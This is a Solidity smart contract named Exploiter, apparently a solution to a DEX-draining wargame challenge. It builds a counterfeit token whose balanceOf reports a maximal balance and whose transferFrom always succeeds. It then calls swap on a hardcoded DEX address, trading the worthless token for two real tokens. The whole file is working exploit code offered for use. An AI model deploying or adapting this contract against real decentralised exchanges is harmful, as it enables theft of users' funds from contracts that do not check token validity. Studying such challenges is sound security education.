
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Dex {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

contract Exploiter {

    uint256 public amount = 100;
    Dex public dex = Dex(0x3B15322a15Bf7E3c6d05466aaFf02Fc31B560516);

    function balanceOf(address payer) public view returns (uint256) {
        if(payer == address(this)) {
            return type(uint256).max;
        } else {
            return amount;
        }
    }

    function transferFrom(address _from, address _to, uint256 _amount) public pure returns (bool) {
        return true;
    }

    function executeSwap(address token1, address token2) public {
        approve();
        dex.swap(address(this), token1, amount);
        dex.swap(address(this), token2, amount);
    }

    // just in case:

    function setAmount(uint256 _amount) public {
        amount = _amount;
    }
    function setDex(address _dex) public {
        dex = Dex(_dex);
    }

    function approve() public {
        dex.approve(address(dex), amount);
    }

    function executeSwapSingle(address token) public {
        dex.swap(address(this), token, amount);
    }

}

